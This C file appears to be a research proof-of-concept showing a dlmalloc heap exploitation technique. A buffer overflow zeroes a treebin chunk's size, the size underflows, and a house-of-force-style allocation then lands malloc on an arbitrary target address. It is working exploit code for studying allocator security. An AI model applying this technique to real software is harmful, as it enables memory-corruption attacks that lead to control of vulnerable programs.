// Thanks to @jinmo123 for analysis
#include <assert.h>
#include <stdlib.h>
#include <stdint.h>

#include "malloc-lib.h"

intptr_t target;

int main() {
  size_t sz = 256;
  size_t xlsz = 0x10000000000;
  size_t lsz = 0x1000;
  size_t fsz = 16;
  void* dst = &target;

  // [PRE-CONDITION]
  //   fsz: fast bin size
  //   sz: non-fast-bin size
  //   lsz: size larger than page (>= 4096)
  //   xlsz: very large size that cannot be allocated
  // [BUG] buffer overflow
  // [POST-CONDITION]
  //    malloc(sz) == dst

  // Make top chunk available
  void* p0 = malloc(sz);

  // Set mr.mflags |= USE_NONCONTIGUOUS_BIT
  void* p1 = malloc(xlsz);

  // Current top size < lsz (4096) and no available bins, so dlmalloc calls sys_alloc
  // Instead of using sbrk(), it inserts current top chunk into treebins
  // and set mmapped area as a new top chunk because of the non-continous bit
  void* p2 = malloc(lsz);

  void* p3 = malloc(sz);
  // [BUG] overflowing p3 to overwrite treebins
  struct malloc_chunk *tc = raw_to_chunk(p3 + chunk_size(sz));
  tc->size = 0;

  // dlmalloc believes that treebins (i.e., top chunk) has enough size
  // However, underflow happens because its size is actually zero
  void* p4 = malloc(fsz);

  // Similar to house-of-force, we can allocate an arbitrary chunk
  void* p5 = malloc(dst - p4 - chunk_size(fsz) \
                  - offsetof(struct malloc_chunk, fd));
  assert(dst == malloc(sz));
}
